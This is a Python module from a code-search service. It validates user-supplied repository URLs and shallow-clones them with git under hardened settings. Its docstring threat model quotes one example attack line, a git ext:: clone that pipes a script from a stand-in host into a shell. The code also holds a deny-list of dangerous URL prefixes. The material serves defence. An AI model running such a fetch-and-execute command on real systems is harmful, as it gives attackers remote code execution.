"""
Fetch a repository to a local directory.

Uses `git` via subprocess rather than GitPython. Two reasons: GitPython's
module-level binary discovery forced the `GIT_PYTHON_REFRESH=quiet`
workaround at the top of v1's `main.py`, and we need precise control over
the flags below, several of which are security-relevant.

SECURITY: THE URL IS ATTACKER-SUPPLIED
--------------------------------------
Anyone who can add a repository controls this string, so `git clone <url>`
is a remote code execution primitive unless the scheme is constrained:

  ext::         git's `ext` transport runs an arbitrary shell command.
                `git clone 'ext::sh -c "curl evil.sh|sh"'` executes it.
  file:// , /   Clones a path on the host, exposing any readable directory
                -- including other tenants' checkouts and /etc.
  --upload-pack Passed inside a URL-looking argument, overrides the remote
                helper binary.
  submodules    A submodule's URL is controlled by the *cloned repository*,
                not by us, and recursion would follow it. Never recurse.

So the scheme is allowlisted rather than denylisted, and the URL is passed
after `--` so it can never be parsed as an option.

Credentials are never prompted for: an interactive prompt in a worker is a
hang, not a login. `GIT_TERMINAL_PROMPT=0` and an empty `GIT_ASKPASS` turn
authentication failures into prompt errors instead.
"""

from __future__ import annotations

import logging
import os
import re
import shutil
import subprocess
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

ALLOWED_SCHEMES = frozenset({"https", "http"})

# Hosts we are willing to fetch from. An allowlist rather than a blocklist:
# blocklists do not stop SSRF against internal addresses, and a code-search
# product has no reason to clone from arbitrary hosts.
DEFAULT_ALLOWED_HOSTS = frozenset({
    "github.com", "www.github.com",
    "gitlab.com", "www.gitlab.com",
    "bitbucket.org", "www.bitbucket.org",
    "codeberg.org", "git.sr.ht",
})

CLONE_TIMEOUT_SECONDS = 600
DEFAULT_MAX_BYTES = 500 * 1024 * 1024  # 500 MB checkout ceiling

_SAFE_REF = re.compile(r"\A[A-Za-z0-9._/-]{1,255}\Z")


class SourceError(Exception):
    """Cloning failed for a reason worth showing the user."""


class UnsafeSourceError(SourceError):
    """The URL was rejected before any process was spawned."""


@dataclass
class Checkout:
    path: Path
    commit_sha: str
    default_branch: str
    name: str


def validate_url(url: str, allowed_hosts: frozenset[str] | None = None) -> str:
    """
    Reject anything that is not a plain HTTPS clone URL on a known host.

    Raises UnsafeSourceError rather than sanitising: silently rewriting a
    URL the user did not intend is worse than refusing it.
    """
    if not url or len(url) > 2048:
        raise UnsafeSourceError("repository URL is empty or implausibly long")

    stripped = url.strip()
    # Catch transports before urlparse, which happily accepts `ext::…`.
    lowered = stripped.lower()
    for prefix in ("ext::", "file:", "ssh:", "git:", "git+", "-", "--"):
        if lowered.startswith(prefix):
            raise UnsafeSourceError(
                f"URL scheme not permitted: {stripped[:40]!r}. "
                "Only https:// clone URLs are accepted."
            )

    parsed = urlparse(stripped)
    if parsed.scheme.lower() not in ALLOWED_SCHEMES:
        raise UnsafeSourceError(
            f"scheme {parsed.scheme!r} not permitted; use https"
        )
    if not parsed.hostname:
        raise UnsafeSourceError("URL has no host")

    hosts = allowed_hosts if allowed_hosts is not None else DEFAULT_ALLOWED_HOSTS
    if parsed.hostname.lower() not in hosts:
        raise UnsafeSourceError(
            f"host {parsed.hostname!r} is not in the allowed list"
        )
    # A username is fine (github.com/user/repo); an embedded password is not.
    if parsed.password:
        raise UnsafeSourceError("credentials must not be embedded in the URL")
    return stripped


def repo_name_from_url(url: str) -> str:
    tail = urlparse(url).path.rstrip("/").split("/")[-1]
    return tail[:-4] if tail.endswith(".git") else (tail or "repository")


def _git_env() -> dict[str, str]:
    env = dict(os.environ)
    env.update({
        # An interactive prompt inside a worker is a hang, not a login.
        "GIT_TERMINAL_PROMPT": "0",
        "GIT_ASKPASS": "",
        "SSH_ASKPASS": "",
        "GCM_INTERACTIVE": "never",
        # Ignore any system/user gitconfig: a configured `url.insteadOf`
        # could rewrite our validated URL into something else entirely.
        "GIT_CONFIG_NOSYSTEM": "1",
        "HOME": env.get("GIT_SAFE_HOME", env.get("HOME", "")),
    })
    return env


def _run_git(args: list[str], cwd: Path | None = None, timeout: int = 60) -> str:
    try:
        result = subprocess.run(  # noqa: S603 - argv list, never shell=True
            # S607: resolving git to an absolute path is not portable
            # across the platforms this runs on, and PATH is not
            # attacker-controlled here -- the worker sets its own
            # environment. The argument list, which IS attacker-
            # influenced, is passed as argv and never through a shell.
            ["git", *args],  # noqa: S607
            cwd=str(cwd) if cwd else None,
            capture_output=True,
            text=True,
            timeout=timeout,
            env=_git_env(),
            check=False,
        )
    except FileNotFoundError as exc:
        raise SourceError("git is not installed or not on PATH") from exc
    except subprocess.TimeoutExpired as exc:
        raise SourceError(f"git timed out after {timeout}s") from exc

    if result.returncode != 0:
        raise SourceError(_clean_git_error(result.stderr or result.stdout))
    return result.stdout.strip()


_NOISE = re.compile(
    r"(Cloning into|remote:|Receiving objects|Resolving deltas|"
    r"Unpacking objects|Updating files|^\s*\d+%)",
    re.IGNORECASE | re.MULTILINE,
)


def _clean_git_error(raw: str) -> str:
    """Keep the meaningful lines; git's progress output is not an error."""
    lines = [
        ln.strip() for ln in (raw or "").splitlines()
        if ln.strip() and not _NOISE.search(ln)
    ]
    seen, unique = set(), []
    for line in lines:
        if line not in seen:
            seen.add(line)
            unique.append(line)
    return "; ".join(unique[:4]) or "git failed with no diagnostic output"


def directory_size(path: Path) -> int:
    total = 0
    for p in path.rglob("*"):
        try:
            if p.is_file():
                total += p.stat().st_size
        except OSError:
            continue
    return total


def clone(
    url: str,
    dest: Path,
    *,
    ref: str | None = None,
    allowed_hosts: frozenset[str] | None = None,
    timeout: int = CLONE_TIMEOUT_SECONDS,
    max_bytes: int = DEFAULT_MAX_BYTES,
) -> Checkout:
    """
    Shallow-clone `url` into `dest` and return the resolved checkout.

    `--depth 1` because we index a snapshot, not history, and full history
    on a large repository is the difference between seconds and minutes of
    a metered worker's time.
    """
    safe_url = validate_url(url, allowed_hosts)
    if ref is not None and not _SAFE_REF.match(ref):
        raise UnsafeSourceError(f"ref {ref!r} contains unexpected characters")

    if dest.exists():
        shutil.rmtree(dest, ignore_errors=True)
    dest.parent.mkdir(parents=True, exist_ok=True)

    args = [
        "clone",
        "--depth", "1",
        "--single-branch",
        # Submodule URLs are controlled by the cloned repository, not by us.
        "--no-recurse-submodules",
        "--no-tags",
        "--quiet",
    ]
    if ref:
        args += ["--branch", ref]
    # `--` terminates option parsing: the URL can never be read as a flag.
    args += ["--", safe_url, str(dest)]

    _run_git(args, timeout=timeout)

    size = directory_size(dest)
    if size > max_bytes:
        shutil.rmtree(dest, ignore_errors=True)
        raise SourceError(
            f"checkout is {size / 1e6:.0f} MB, over the {max_bytes / 1e6:.0f} MB limit"
        )

    commit = _run_git(["rev-parse", "HEAD"], cwd=dest)
    try:
        branch = _run_git(["rev-parse", "--abbrev-ref", "HEAD"], cwd=dest)
    except SourceError:
        branch = ref or "HEAD"

    logger.info(
        "cloned %s at %s (%s, %.1f MB)", safe_url, commit[:8], branch, size / 1e6
    )
    return Checkout(
        path=dest,
        commit_sha=commit,
        default_branch=branch,
        name=repo_name_from_url(safe_url),
    )


def remote_head(url: str, ref: str = "HEAD",
                allowed_hosts: frozenset[str] | None = None) -> str:
    """
    Resolve a remote ref without cloning.

    Lets the worker skip a full clone when the indexed commit already
    matches -- the cheapest possible incremental check.
    """
    safe_url = validate_url(url, allowed_hosts)
    out = _run_git(["ls-remote", "--", safe_url, ref], timeout=60)
    if not out:
        raise SourceError(f"remote has no ref {ref!r}")
    return out.split()[0]
